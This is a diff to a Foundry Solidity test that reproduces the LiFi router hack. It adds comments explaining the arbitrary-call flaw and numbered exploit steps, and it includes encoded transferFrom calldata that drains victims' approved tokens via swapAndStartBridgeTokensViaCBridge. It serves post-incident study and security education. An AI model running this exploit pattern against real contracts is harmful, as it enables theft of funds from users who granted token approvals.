@@ -5,6 +5,9 @@ import "forge-std/Test.sol";
 import "./../interface.sol";
 
 interface ILIFI {
+    // VULNERABILITY INTERFACE: the SwapData struct is the attack vector surface.
+    // Every field is attacker-controlled and passed through to low-level calls without sanitization
+    // inside the implementation of swapAndStartBridgeTokensViaCBridge.
     struct LiFiData {
         bytes32 transactionId;
         string integrator;
@@ -54,12 +57,37 @@ contract ContractTest is Test {
     function testExploit() public {
         cheats.startPrank(from);
 
-        // The Vulnerability
-        // The hack took advantage of our pre-bridge swap feature. Our smart contract allows a caller to pass an array of multiple swaps using any address with arbitrary calldata.
-
-        // This design gave us maximum flexibility in what DEXs we could call and what methods we could call. This also allowed anyone to call other contracts, not just DEXs. Our contract checks to make sure that the result of the swap or swaps is enough tokens to continue the bridging operation.
-
-        // The attacker started by passing a legitimate swap of a small amount followed by multiple calls directly to various token contracts. Specifically, they called the `transferFrom` method which allowed the attacker to transfer funds from users’ wallets that had previously given infinite approval to our contract for that specific token.
+        // VULNERABILITY: Arbitrary External Call in Multi-Swap Pre-Bridge Logic (No CallTo Whitelist)
+        // Root cause: In LiFi's swap facet (called via diamond at lifi=0x5A9Fd7c39a6C488E715437D7b1f3C823d5596eD1),
+        // swapAndStartBridgeTokensViaCBridge accepts SwapData[] with completely untrusted (callTo, approveTo, callData, sendingAssetId, fromAmount).
+        // The internal loop (see commented LibAsset logic at _swapData[0] and general execution path) does:
+        //   1. if (!isNative && balance < fromAmount) transferFromERC20(sendingAssetId, msg.sender, this, fromAmount)
+        //   2. if (!isNative) approveERC20(sendingAssetId, approveTo, fromAmount)
+        //   3. (success, res) = callTo.call{value}(callData)
+        // NO whitelisting of callTo (only DEX routers expected), NO selector allowlist, NO post-swap balance delta check per leg,
+        // and crucially the final bridge gate only verifies that the *receivingAssetId* balance on the contract >= required amount
+        // (here 40M USDC after the initial leg). Side-effect calls are invisible to the accounting.
+        // Because prior users had granted *infinite* ERC20 approvals to the LiFi diamond (standard for any swap/bridge router),
+        // any transferFrom(approved_victim, attacker, amt) executed with msg.sender==LiFi succeeds.
+        // Code references: ILIFI.SwapData struct (lines 19-26), _swapData[0] (legit 0x aggregator, lines 71-98),
+        // _swapData[1..37] (37 drain entries with callTo=ERC20, callData=transferFrom selector 0x23b872dd, fromAmount=0),
+        // the call at end of testExploit.
+        // Why it works: msg.sender for the inner .call is the LiFi contract (trusted by victims' approvals);
+        // the 0-amount drain legs do not disturb the fromAmount pull or the final balance check on the bridge token.
+        // Impact: Direct theft of any ERC20 from any user who had approved LiFi (USDT, USDC, DAI, AAVE, GRT, etc.).
+        // Attacker exfiltrated tokens belonging to many different victims in one tx to the receiver.
+        //
+        // EXPLOIT STEPS:
+        // 1. Attacker (or funded account 'from') calls swapAndStartBridgeTokensViaCBridge on LiFi with a 38-element SwapData[].
+        // 2. Leg 0: supply 50M USDT (fromAmount), approve 0x aggregator, call 0xDef1... with sellToUniswap calldata;
+        //    this pulls USDT from attacker, swaps it inside 0x, and leaves ~40M+ USDC inside the LiFi contract.
+        // 3. Legs 1-37: for each, set fromAmount=0, sending/receiving=0x0, approveTo=0x0, callTo=<victim token>,
+        //    callData=transferFrom(victim_who_approved_LiFi, exploiter_receiver, specific_amount).
+        //    LiFi executes token.transferFrom(...) as the caller; allowance check passes -> tokens moved to exploiter.
+        // 4. After array, construct CBridgeData for 40M USDC to same receiver on dst chain 42161.
+        // 5. LiFi's post-swap check passes (it sees the USDC from leg 0), starts the cBridge.
+        // 6. Attacker receives the bridged funds + all the directly-drained tokens (the transferFroms already sent them on mainnet).
+        // 7. (In real attack the bridge leg may have been a smokescreen; the profit was in the 37 side drains.)
         ILIFI.LiFiData memory _lifiData = ILIFI.LiFiData({
             transactionId: 0x1438ff9dd1cf9c70002c3b3cbec9c4c1b3f9eb02e29bcac90289ab3ba360e605,
             integrator: "li.finance",
@@ -103,6 +131,9 @@ contract ContractTest is Test {
         _swapData[1] = ILIFI.SwapData({
             approveTo: 0x0000000000000000000000000000000000000000,
             callData: hex"23b872dd000000000000000000000000445c21166a3cb20b14fa84cfc5d122f6bd3ffa17000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000a4a88a24badca2e52e", // transferFrom(address,address,uint256)
+            // VULNERABILITY DETAIL (example drain leg): callTo == MATIC token (0x7D1A...), callData == transferFrom(0x445c21..., exploiter, 0xa4a8...).
+            // When executed as: MATIC.transferFrom(victim, receiver, amt) the msg.sender inside transferFrom is the LiFi contract.
+            // All such victims had set allowance[LiFi] = type(uint).max in prior interactions with the router.
             callTo: 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0,
             fromAmount: 0,
             receivingAssetId: 0x0000000000000000000000000000000000000000,
@@ -406,6 +437,10 @@ contract ContractTest is Test {
             token: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
         });
 
+        // VULNERABILITY: Final accounting gate only inspects bridge token balance; arbitrary calls in _swapData[] are trusted
+        // Evidence: the call below executes the 38 SwapData entries in sequence inside LiFi. The 37 transferFrom calls
+        // (encoded with selector 0x23b872dd) target tokens that had previously approved the LiFi diamond.
+        // No reentrancy or balance snapshot is taken around individual legs, allowing the drains.
         ILIFI(lifi).swapAndStartBridgeTokensViaCBridge(_lifiData, _swapData, _cBridgeData);
     }
 }
